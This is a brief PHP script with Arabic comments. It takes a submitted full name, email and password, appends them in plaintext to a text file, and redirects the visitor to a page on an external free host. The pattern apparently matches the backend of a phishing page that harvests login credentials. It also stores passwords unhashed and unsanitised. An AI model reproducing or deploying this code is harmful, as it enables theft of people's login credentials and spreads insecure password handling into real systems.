<?php
// استقبال البيانات من النموذج
$fullname = $_POST['fullname'];
$user_email = $_POST['username'];
$user_password = $_POST['password'];

// حفظ البيانات في ملف نصي
$file = fopen("users.txt", "a");
fwrite($file, "Full Name: $fullname, Email: $user_email, Password: $user_password\n");
fclose($file);

// إعادة توجيه المستخدم إلى صفحة redirect
header("Location: http://hudasecrets.free.nf/redirect.html");
exit();
?>
